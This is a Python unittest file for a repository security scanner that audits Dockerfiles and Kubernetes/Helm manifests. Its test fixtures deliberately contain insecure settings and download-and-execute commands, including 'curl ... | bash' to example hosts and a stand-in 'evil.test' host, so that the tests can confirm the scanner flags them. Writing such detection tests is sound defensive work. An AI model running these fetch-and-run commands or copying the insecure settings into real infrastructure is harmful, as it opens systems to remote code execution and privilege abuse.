import importlib.util
import json
import pathlib
import tempfile
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
SCRIPT_PATH = ROOT / ".github" / "scripts" / "audit-infra-safety.py"

SPEC = importlib.util.spec_from_file_location("audit_infra_safety", SCRIPT_PATH)
assert SPEC and SPEC.loader
audit_infra_safety = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(audit_infra_safety)


class AuditInfraSafetyTests(unittest.TestCase):
    def test_multistage_dockerfile_with_pinned_digests_and_nonroot_final_user_passes(self):
        df = "\n".join([
            "FROM --platform=linux/amd64 mcr.microsoft.com/dotnet/sdk:10.0@sha256:" + "a" * 64 + " AS build",
            "WORKDIR /src",
            "FROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:" + "b" * 64,
            "COPY --from=build /app .",
            "USER 10001:10001",
        ])
        findings = audit_infra_safety.check_dockerfile_content(df, "Dockerfile", require_pinned_digest=True)
        self.assertEqual(findings, [])

    def test_dockerfile_flags_latest_root_final_stage_add_url_chmod_777_and_pipe_shell(self):
        df = "\n".join([
            "FROM alpine:latest AS builder",
            "USER appuser",
            "FROM ubuntu:24.04",
            "ADD https://example.com/tool.tar.gz /tmp/",
            "RUN chmod -R 777 /app && curl -sSL https://example.com/install.sh | bash",
        ])
        findings = audit_infra_safety.check_dockerfile_content(df, "docker/App.Dockerfile", require_pinned_digest=True)
        rules = {f["ruleId"] for f in findings}
        self.assertIn("DOCKERFILE_LATEST_TAG", rules)
        self.assertIn("DOCKERFILE_UNPINNED_DIGEST", rules)
        self.assertIn("DOCKERFILE_ADD_REMOTE_URL", rules)
        self.assertIn("DOCKERFILE_CHMOD_777", rules)
        self.assertIn("DOCKERFILE_PIPE_TO_SHELL", rules)
        self.assertIn("DOCKERFILE_ROOT_USER", rules)

    def test_k8s_helm_clean_manifest_passes(self):
        manifest = "\n".join([
            "apiVersion: apps/v1",
            "kind: Deployment",
            "spec:",
            "  template:",
            "    spec:",
            "      automountServiceAccountToken: false",
            "      securityContext:",
            "        runAsNonRoot: true",
            "        runAsUser: 10001",
            "      containers:",
            "        - name: api",
            "          image: ghcr.io/dustbowl-games/api:1.2.3",
            "          securityContext:",
            "            privileged: false",
            "            allowPrivilegeEscalation: false",
            "            readOnlyRootFilesystem: true",
        ])
        findings = audit_infra_safety.check_k8s_helm_content(manifest, "k8s/deployment.yaml")
        self.assertEqual(findings, [])

    def test_k8s_helm_flags_unsafe_flags_and_supports_baseline(self):
        bad_manifest = "\n".join([
            "apiVersion: apps/v1",
            "kind: Deployment",
            "spec:",
            "  template:",
            "    spec:",
            "      hostNetwork: true",
            "      automountServiceAccountToken: true",
            "      securityContext:",
            "        runAsNonRoot: false",
            "        runAsUser: 0",
            "      containers:",
            "        - name: api",
            "          image: ghcr.io/dustbowl-games/api:latest",
            "          env:",
            "            - name: CONN",
            '              value: "Host=pg;Trust Server Certificate=true"',
            "          securityContext:",
            "            privileged: true",
            "            allowPrivilegeEscalation: true",
        ])
        findings = audit_infra_safety.check_k8s_helm_content(bad_manifest, "helm/templates/deployment.yaml")
        rules = {f["ruleId"] for f in findings}
        self.assertIn("K8S_HOST_NAMESPACE", rules)
        self.assertIn("K8S_AUTOMOUNT_SA_TOKEN", rules)
        self.assertIn("K8S_RUN_AS_ROOT", rules)
        self.assertIn("K8S_RUN_AS_USER_ZERO", rules)
        self.assertIn("K8S_LATEST_IMAGE_TAG", rules)
        self.assertIn("K8S_INSECURE_TLS_CONNSTRING", rules)
        self.assertIn("K8S_PRIVILEGED_CONTAINER", rules)
        self.assertIn("K8S_ALLOW_PRIVILEGE_ESCALATION", rules)
        self.assertIn("K8S_MISSING_READONLY_ROOT_FS", rules)

        baseline = [{"file": "helm/templates/deployment.yaml", "ruleId": r} for r in rules]
        baselined, unapproved = audit_infra_safety.apply_baseline(findings, baseline)
        self.assertEqual(len(baselined), len(findings))
        self.assertEqual(unapproved, [])

    def test_dockerfile_pipe_to_shell_catches_bin_and_sudo_variants(self):
        for cmd in (
            "RUN curl -sSL https://example.com/a.sh | /bin/sh",
            "RUN curl -sSL https://example.com/a.sh | /bin/bash",
            "RUN wget -qO- https://example.com/a.sh | sudo sh",
            "RUN curl -sSL https://example.com/a.sh | sudo bash",
            "RUN curl -sSL https://example.com/a.sh | sudo -E bash",
        ):
            with self.subTest(cmd=cmd):
                df = f"FROM ubuntu:24.04\n{cmd}\nUSER 10001\n"
                findings = audit_infra_safety.check_dockerfile_content(df, "Dockerfile")
                self.assertEqual([f["ruleId"] for f in findings], ["DOCKERFILE_PIPE_TO_SHELL"])

        clean_df = "FROM ubuntu:24.04\nRUN curl -sSL https://example.com/tool.tar.gz -o /tmp/tool.tar.gz\nUSER 10001\n"
        self.assertEqual(audit_infra_safety.check_dockerfile_content(clean_df, "Dockerfile"), [])

    def test_helm_values_flags_nested_image_latest_tag_and_yaml_anchor_without_false_positive(self):
        values = "\n".join([
            "image:",
            "  repository: ghcr.io/dustbowl-games/api",
            "  tag: latest",
            "worker:",
            "  image:",
            "    repository: ghcr.io/dustbowl-games/worker",
            '    tag: "latest"',
            "sidecar:",
            "  image:",
            "    repository: ghcr.io/dustbowl-games/sidecar",
            "    tag: 'latest'",
            "anchored_bad:",
            "  image: &img",
            "    repository: ghcr.io/dustbowl-games/anchored",
            "    tag: latest",
            "anchored_clean:",
            "  image: &img_clean",
            "    repository: ghcr.io/dustbowl-games/anchored-clean",
            '    tag: "1.4.2"',
            "release:",
            "  tag: latest",
            "clean:",
            "  image:",
            "    repository: ghcr.io/dustbowl-games/clean",
            '    tag: "1.4.2"',
            "securityContext:",
            "  readOnlyRootFilesystem: true",
        ])
        findings = audit_infra_safety.check_k8s_helm_content(values, "helm/app/values.yaml")
        latest_findings = [f for f in findings if f["ruleId"] == "K8S_LATEST_IMAGE_TAG"]
        self.assertEqual(len(latest_findings), 4)
        self.assertEqual([f["line"] for f in latest_findings], [3, 7, 11, 15])

    def test_baseline_count_zero_grants_zero_waivers_and_rejects_invalid_count(self):
        finding = {
            "file": "helm/a.yaml",
            "line": 1,
            "ruleId": "K8S_INSECURE_TLS_CONNSTRING",
            "fingerprint": "x",
            "message": "m",
        }
        baselined, unapproved = audit_infra_safety.apply_baseline([finding], [{**finding, "count": 0}])
        self.assertEqual(baselined, [])
        self.assertEqual(len(unapproved), 1)
        for bad_count in ("999", -1, 1.5, False):
            with self.subTest(bad_count=bad_count):
                with self.assertRaises(ValueError):
                    audit_infra_safety.apply_baseline([finding], [{**finding, "count": bad_count}])

    def test_dockerfile_catches_uid_gid_root_and_run_heredoc_bypasses(self):
        digest = "a" * 64
        for user_spec in ("root:root", "0:0", "0000:1000"):
            with self.subTest(user_spec=user_spec):
                df = f"FROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:{digest}\nUSER {user_spec}\n"
                rules = {f["ruleId"] for f in audit_infra_safety.check_dockerfile_content(df, "Dockerfile", require_pinned_digest=True)}
                self.assertIn("DOCKERFILE_ROOT_USER", rules)

        heredoc_bad = (
            f"FROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:{digest}\n"
            "RUN <<EOF\n"
            "chmod 777 /app\n"
            "curl -sSL https://evil.test/x.sh | bash\n"
            "EOF\n"
            "USER 10001:10001\n"
        )
        rules_hd = {f["ruleId"] for f in audit_infra_safety.check_dockerfile_content(heredoc_bad, "Dockerfile", require_pinned_digest=True)}
        self.assertTrue({"DOCKERFILE_CHMOD_777", "DOCKERFILE_PIPE_TO_SHELL"} <= rules_hd, rules_hd)

        heredoc_clean = (
            f"FROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:{digest}\n"
            "RUN <<-SCRIPT\n"
            "\t# chmod 777 /ignored-comment\n"
            "\techo ok\n"
            "\tSCRIPT\n"
            "USER 10001:10001\n"
        )
        self.assertEqual(audit_infra_safety.check_dockerfile_content(heredoc_clean, "Dockerfile", require_pinned_digest=True), [])

    def test_k8s_catches_tls_colon_ssl_mode_latest_digest_tpl_and_rejects_traversal(self):
        digest = "b" * 64
        k8s_bad = (
            "apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n      containers:\n"
            f"        - name: app\n          image: ghcr.io/org/app:latest@sha256:{digest}\n"
            "          securityContext:\n            readOnlyRootFilesystem: true\n"
            "          env:\n            - name: C1\n              value: \"Ssl Mode=Disable\"\n"
            "            - name: C2\n              value: \"TrustServerCertificate: true\"\n"
        )
        rules = [f["ruleId"] for f in audit_infra_safety.check_k8s_helm_content(k8s_bad, "helm/app/templates/dep.yaml")]
        self.assertIn("K8S_LATEST_IMAGE_TAG", rules)
        self.assertEqual(rules.count("K8S_INSECURE_TLS_CONNSTRING"), 2)

        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp) / "repo"
            outside = pathlib.Path(tmp) / "outside"
            (root / "helm" / "app" / "templates").mkdir(parents=True)
            outside.mkdir(parents=True)
            (outside / "Chart.yaml").write_text("apiVersion: v2\nname: out\n", encoding="utf-8")
            tpl = root / "helm" / "app" / "templates" / "_helpers.tpl"
            tpl.write_text('{{- define "app.conn" -}}Host=db;Trust Server Certificate=true{{- end -}}\n', encoding="utf-8")

            rc_tpl = audit_infra_safety.main(["--repo-root", str(root), "--no-dockerfile", "--check-k8s-helm"])
            self.assertEqual(rc_tpl, 1)

            rc_outside = audit_infra_safety.main(["--repo-root", str(root), "--no-dockerfile", "--check-k8s-helm", "--helm-chart-dir", "../outside"])
            self.assertEqual(rc_outside, 1)

            baseline = root / "infra-baseline.json"
            baseline.write_text(json.dumps({"infra_safety_baseline": [{"file": "helm/app/templates/_helpers.tpl", "ruleId": "K8S_INSECURE_TLS_CONNSTRING", "count": 0}]}), encoding="utf-8")
            rc_zero = audit_infra_safety.main(["--repo-root", str(root), "--no-dockerfile", "--check-k8s-helm", "--baseline", str(baseline)])
            self.assertEqual(rc_zero, 1)

    def test_dockerfile_pipe_to_shell_catches_multistage_pipes_and_avoids_false_positives(self):
        bad_cmds = (
            "RUN curl -sSL https://example.com/install.sh | tee /tmp/x | bash",
            "RUN wget -qO- https://example.com/install.sh | grep -v foo | sudo bash",
            "RUN fetch -o - https://example.com/install.sh | cat | /bin/sh",
            "RUN irm https://example.com/install.ps1 | pwsh",
            "RUN iwr -useb https://example.com/install.ps1 | powershell",
        )
        for cmd in bad_cmds:
            with self.subTest(bad_cmd=cmd):
                df = f"FROM ubuntu:24.04\n{cmd}\nUSER 10001\n"
                findings = audit_infra_safety.check_dockerfile_content(df, "Dockerfile")
                self.assertEqual([f["ruleId"] for f in findings], ["DOCKERFILE_PIPE_TO_SHELL"])

        safe_cmds = (
            "RUN curl -sSL https://example.com/tool.tar.gz -o /tmp/t.tar.gz && echo ok | bash",
            "RUN curl -sSL https://example.com/tool.tar.gz -o /tmp/t.tar.gz; echo ok | sh",
            "RUN curl -sSL https://example.com/tool.tar.gz || bash -c 'exit 1'",
            "RUN curl -sSL https://example.com/tool.tar.gz | sha256sum -c",
            "RUN curl -sSL https://example.com/tool.tar.gz | tee /tmp/bash_log",
        )
        for cmd in safe_cmds:
            with self.subTest(safe_cmd=cmd):
                df = f"FROM ubuntu:24.04\n{cmd}\nUSER 10001\n"
                self.assertEqual(audit_infra_safety.check_dockerfile_content(df, "Dockerfile"), [])


if __name__ == "__main__":
    unittest.main()
